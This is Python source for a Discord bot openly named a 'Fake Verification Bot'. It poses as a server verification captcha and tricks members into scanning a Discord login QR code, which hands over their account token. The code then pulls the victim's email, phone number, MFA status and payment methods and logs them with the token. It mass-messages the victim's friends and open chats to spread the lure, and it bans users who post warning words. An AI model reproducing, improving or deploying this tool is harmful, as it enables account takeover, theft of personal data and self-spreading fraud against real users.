#Importing modules
import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests, os
from remoteauthclient import RemoteAuthClient
from nextcord import ButtonStyle
from nextcord.ext import commands
from nextcord.ui import Button, View
from nextcord.utils import get
from websockets import connect
from websockets.exceptions import ConnectionClosedOK, ConnectionClosedError
from websockets.typing import Origin
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from colorama import Fore, init; init(autoreset=True)
from urllib.request import Request, urlopen
from async_hcaptcha import AioHcaptcha
from async_hcaptcha.utils import getUrl
from time import sleep

os.system("git clone https://github.com/RuslanUC/RemoteAuthClient -b dev && cd RemoteAuthClient && pip uninstall remoteauthclient && pip install .")

y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX

#Get the headers
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

#Recovery of the configuration put in the config.json file
with open('config.json') as f:
    config = json.load(f)

botToken = config.get('Bot Token')
prefix = config.get('Prefix')
ownerid = config.get("Owner ID")
command_name = config.get('command_name')
logs_channel_id = config.get('logs_channel_id')
give_role = config.get('give_role')
role_name = config.get('role_name')
mass_dm = config.get('mass_dm')
message = config.get('message')

#Bot title
def bot_title():
    os.system("cls" if os.name == "nt" else "clear")
    if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW(f"Fake Verification Bot - Made by Pxsx")
    else: pass
    print("\n\n")
    print(f"""{Fore.RESET}
    \t\t\t███████╗ █████╗ ██╗  ██╗███████╗    ██╗   ██╗███████╗██████╗ ██╗███████╗██╗ ██████╗ █████╗ ████████╗ ██████╗ ██████╗ 
    \t\t\t██╔════╝██╔══██╗██║ ██╔╝██╔════╝    ██║   ██║██╔════╝██╔══██╗██║██╔════╝██║██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
    \t\t\t█████╗  ███████║█████╔╝ █████╗      ██║   ██║█████╗  ██████╔╝██║█████╗  ██║██║     ███████║   ██║   ██║   ██║██████╔╝
    \t\t\t██╔══╝  ██╔══██║██╔═██╗ ██╔══╝      ╚██╗ ██╔╝██╔══╝  ██╔══██╗██║██╔══╝  ██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗
    \t\t\t██║     ██║  ██║██║  ██╗███████╗     ╚████╔╝ ███████╗██║  ██║██║██║     ██║╚██████╗██║  ██║   ██║   ╚██████╔╝██║  ██║
    \t\t\t╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝      ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝\n""".replace('█', f'{Fore.LIGHTBLUE_EX}█{Fore.LIGHTYELLOW_EX}'))
                                                                                                         
    print(f"\t{Fore.LIGHTYELLOW_EX}----------------------------------------------------------------------------------------------------------------------------------------------------------\n")
    print(f"\t{Fore.LIGHTWHITE_EX} | https://github.com/Pxsx | https://github.com/pxsx/Fake-Verification-Bot \n")
    print(f"\t{Fore.LIGHTYELLOW_EX}----------------------------------------------------------------------------------------------------------------------------------------------------------\n".replace('|', f'{Fore.LIGHTBLUE_EX}|{Fore.LIGHTWHITE_EX}'))

#Bot home page
def startprint():
    bot_title()

    if give_role:
        give_role_texte = f"""{Fore.GREEN}Active {Fore.RESET}with {Fore.LIGHTWHITE_EX}{role_name if role_name != "ROLE-NAME-HERE" else "None"}"""
    else:
        give_role_texte = f"{Fore.RED}Disabled"
    
    if mass_dm == 3:
        mass_dm_texte = f"{Fore.GREEN}Friends{w}/{Fore.GREEN}Current DMs"
    elif mass_dm == 2:
        mass_dm_texte = f"{Fore.GREEN}Friends"
    elif mass_dm == 1:
        mass_dm_texte = f"{Fore.GREEN}Current DMs"
    else:
        mass_dm_texte = f"{Fore.RED}Disabled"

    print(f"""
    \t\t\t\t\t\t{y}[{b}+{y}]{w} Bot Informations:\n
    \t\t\t\t\t\t[#] Logged in as:    {bot.user.name}
    \t\t\t\t\t\t[#] Bot ID:          {bot.user.id}
    \t\t\t\t\t\t[#] Logs Channel:    {logs_channel_id if logs_channel_id != "LOGS-CHANNEL-ID-HERE" else "None"}
    \t\t\t\t\t\t[#] Command Name:    {bot.command_prefix}{command_name}\n\n
    \t\t\t\t\t\t{y}[{b}+{y}]{w} Settings View:\n
    \t\t\t\t\t\t[#] Give Role:       {give_role_texte}
    \t\t\t\t\t\t[#] Mass DM Type:    {mass_dm_texte}\n\n\n""".replace('[#]', f'{y}[{w}#{y}]{w}'))
    print(f"\t\t\t\t\t\t{y}[{Fore.GREEN}!{y}]{w} Bot is now Online! Wish u luck with hacking Accounts <3")

intents = nextcord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix=prefix, description="Fake Verification Bot - Made by Pxsx", intents=intents)

#Launching the Bot
def Init():
    if botToken == "":
        bot_title()
        input(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a token in the config.json file.")
        return
    elif prefix == "":
        bot_title()
        input(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Please set a prefix in the config.json file.")
        return
    try: bot.run(botToken)
    except:
        os.system("cls")
        bot_title()
        # input(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} The token located in the config.json file is invalid")
        raise Exception # Exceptions are raised, when the bot can't login. reasons for this can be a invalid token, not all intents enabled, connection error etc.
        return

#Event initialization
@bot.event
async def on_ready():
    startprint()
    await bot.change_presence(activity=nextcord.Game(name="Verifies New Members"))

@bot.event
async def on_message(message):
  msg = message.content
  if message.author == bot.user or str(message.author.id) == ownerid and msg.lower() != f"{bot.command_prefix}{command_name}".lower(): return
  with open("blacklist.txt", "r") as blfile: bllines = blfile.read().splitlines()
  if msg.lower() in bllines: 
    await message.delete()
    await message.author.ban(reason=f"Trying to Warn others by using a Blacklisted Word: {msg.lower()}")
  await bot.process_commands(message)

#Bot command
@bot.command(name=command_name)
async def start(ctx):

    #Recover the name of the channel logs
    try:
        logs_channel = bot.get_channel(int(logs_channel_id))
    except:
        logs_channel = None
    verification = Button(label="Verify Me", style=ButtonStyle.blurple)

    #If the verification button is clicked
    async def verification_callback(interaction):
        
        #RemoteAuthClient by RuslanUC
        class User:
            def __init__(self, _id, _username, _discriminator, _avatar):
                self.id = _id
                self.username = _username
                self.discriminator = _discriminator
                self.avatar = _avatar
        
        c = RemoteAuthClient()
        """
        with open("proxies.txt", "r") as f:
            proxies = f.readlines()
            
        if proxies == []:
            c = RemoteAuthClient()
            
        else:
            for proxy in proxies:
                print(proxy)
                if ":" in proxy:
                    proxy = proxy.split(":")
                    
                    try: hostname, port, username, password = proxy[0], proxy[1], proxy[2], proxy[3]
                    
                    except IndexError:
                        try: hostname, port, username, password = proxy[0], proxy[1], None, None
                        except IndexError: print("proxies are wrong formatted, please use ip:port or ip:port:username:password")
                    
                else:
                    print("Proxy Need to be seperated by at least a :")
        
            c = RemoteAuthClient(proxy=proxy, proxy_auth={"login": username, "password": password} if username and password is not None else None)
        """
            
        #QR Creation, Informations sender, Role giver, Mass DM sender, ...
        @c.event("on_fingerprint")
        async def on_fingerprint(data):
                
            @c.event("on_cancel")
            async def on_cancel():
                print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Auth canceled: {data}")
    
            @c.event("on_timeout")
            async def on_timeout():
                print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Timeout: {data}")
    
            embed_qr.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=256x256&data={data}")
            await interaction.edit_original_message(embed=embed_qr)
            print(f"\t\t\t\t\t\t[{Fore.LIGHTGREEN_EX}!{y}]{w} QR Code Generated: {data}")
    
            @c.event("on_userdata")
            async def on_userdata(user):
                if not os.path.isfile("database.json"):
                    json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
    
                database = json.load(open("database.json", encoding="utf-8"))
    
                if not user.id in database:
                    database[user.id] = {}
    
                database[user.id]["username"] = f"{user.username}#{user.discriminator}"
                database[user.id]["avatar_url"] = f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png"
    
                json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)
                print(f"\t\t\t\t\t\t{y}[{b}#{y}]{w} {user.username}#{user.discriminator} ({user.id})")
                
                @c.event("on_captcha")
                async def on_captcha(captcha_data):
                    captcha_key = None
                    for _ in range(3):
                        solver = AioHcaptcha(captcha_data["captcha_sitekey"], "https://discord.com/login", {"executable_path": "driver/chromedriver.exe"})
                        try:
                            captcha_key = await solver.solve(custom_params={"rqdata": captcha_data["captcha_rqdata"]})
                            break
                        except KeyError:
                            continue
                    return captcha_key
                
                @c.event("on_token")
                async def on_token(token):
                    if not os.path.isfile("database.json"):
                        json.dump({}, open("database.json", "w", encoding="utf-8"), indent=4)
    
                    database = json.load(open("database.json", encoding="utf-8"))

                    if not user.id in database:
                        database[user.id] = {}

                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=getheaders(token))
                        if res.status_code == 200:
                            res_json = res.json()
                            avatar_id = res_json['avatar']
                            phone_number = res_json['phone']
                            email = res_json['email']
                            mfa_enabled = res_json['mfa_enabled']
                            flags = res_json['flags']
                            locale = res_json['locale']
                            verified = res_json['verified']
                            has_nitro = False
                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))
                            nitro_data = res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            billing_info = []
                            for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token, 'Content-Type': 'application/json'}).json():
                                if x['type'] == 1:
                                    data = {'Payment Type': 'Credit Card', 'Valid': not x['invalid']}
    
                                elif x['type'] == 2:
                                    data = {'Payment Type': 'PayPal', 'Valid': not x['invalid']}
    
                                billing_info.append(data)
                            payment_methods = len(billing_info)
                            database[user.id]["avatar_id"] = avatar_id
                            database[user.id]["phone_number"] = phone_number
                            database[user.id]["email"] = email
                            database[user.id]["mfa_enabled"] = mfa_enabled
                            database[user.id]["flags"] = flags
                            database[user.id]["locale"] = locale
                            database[user.id]["verified"] = verified
                            database[user.id]["has_nitro"] = has_nitro
                            database[user.id]["payment_methods"] = payment_methods
                            if logs_channel:
                                embed_user = nextcord.Embed(title=f"**New user verified: {user.username}#{user.discriminator}**", description=f"```yaml\nUser ID: {user.id}\nAvatar ID: {avatar_id}\nPhone Number: {phone_number}\nEmail: {email}\nMFA Enabled: {mfa_enabled}\nFlags: {flags}\nLocale: {locale}\nVerified: {verified}\nHas Nitro: {has_nitro}\nPayment Methods: {payment_methods}\n```\n```yaml\nToken: {token}\n```", color=5003474)
                    except:
                        if logs_channel:
                            embed_user = nextcord.Embed(title=f"**New user verified: {user.username}#{user.discriminator}**", description=f"```yaml\nUser ID: {user.id}\nToken: {token}\n```\n```yaml\nNo other information found\n```", color=5003474)
                        pass
                    
                    database[user.id]["token"] = token
                
                    json.dump(database, open("database.json", "w", encoding="utf-8"), indent=4)

                    print(f"\t\t\t\t\t\t{y}[{b}#{y}]{w} Token: {token}")
                    if logs_channel:
                        embed_user.set_footer(text="Made by Pxsx »» https://github.com/Pxsx")
                        embed_user.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                        await logs_channel.send(embed=embed_user)
                    
                    #If Enable, gives a role after verification
                    if give_role == True:
                        try:
                            await interaction.user.add_roles(get(ctx.guild.roles, name=role_name))
                            print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Role added to {user.username}#{user.discriminator}")
                        except:
                            print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} There is a problem with your role. Check the Name and make sure it can give this role")

                    #If Enable, DM all the current person's private chat
                    if mass_dm == 1 or mass_dm == 3:
                        try:
                            success = 0
                            failures = 0
                            channel_id = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
    
                            if not channel_id:
                                print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} This guy is lonely, he aint got no dm's...")
                            for channel in [channel_id[i:i+3] for i in range(0, len(channel_id), 3)]:
                                for channel2 in channel:
                                    for _ in [x["username"] + "#" + x["discriminator"] for x in channel2["recipients"]]:
                                        try:
                                            requests.post(f'https://discord.com/api/v9/channels/' + channel2['id'] + '/messages', headers={'Authorization': token}, data={"content": f"{message}"})
                                            success += 1
                                            sleep(.5)
                                        except:
                                            failures += 1
                                            sleep(.5)
                                            pass
                            print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Current DM(s) successfully messaged")
                        except Exception as e:
                            print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
                            pass
                    
                    #If active, DM all user's friends
                    if mass_dm == 2 or mass_dm == 3:
                        try:
                            getfriends = json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())

                            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\n{message}\n-----------------------------325414537030329320151394843687--'
                            for friend in getfriends:
                                try:
                                    chat_id = json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=json.dumps({"recipient_id": friend["id"]}).encode())).read().decode())["id"]
                                    send_message = urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=payload.encode())).read().decode()
                                    send_message(token, chat_id, payload)
                                except:
                                    pass
                                sleep(.5)

                            if len(getfriends) == 0:
                                print(f"\t\t\t\t\t\t{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTWHITE_EX} This guy is lonely, he aint got no friends...")
                            else:
                                print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTGREEN_EX}!{y}]{w} Friend(s) successfully messaged")
                        except Exception as e:
                            print(f"\t\t\t\t\t\t{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
                            pass
        
        #Embed Creation
        asyncio.create_task(c.run())
        embed_qr = nextcord.Embed(title="__**Hello, are you human? Let's find out!**__", description="You are seeing this because your account has been flagged for verification...\n\n**Please follow these steps to complete your verification**:\n1️⃣ *Open the Discord Mobile application*\n2️⃣ *Go to settings*\n3️⃣ *Choose the \"Scan QR Code\" option*\n4️⃣ *Scan the QR code below*", color=5003474)
        embed_qr.set_footer(text="Note: captcha expires in 2 minutes")
        embed_qr.set_thumbnail(url="https://emoji.discord.st/emojis/aa142d2c-681c-45a2-99e9-a6e63849b351.png")
        await interaction.response.send_message(embed=embed_qr, ephemeral=True)

    verification.callback = verification_callback

    myview = View(timeout=None)
    myview.add_item(verification)
    embed = nextcord.Embed(title="**Verification required!**", description="🔔 To access this server, you need to pass the verification first\n🧿 Press the button bellow", color=5003474)
    await ctx.send(embed=embed, view=myview)

#Start Everything
if __name__ == '__main__':
    Init()
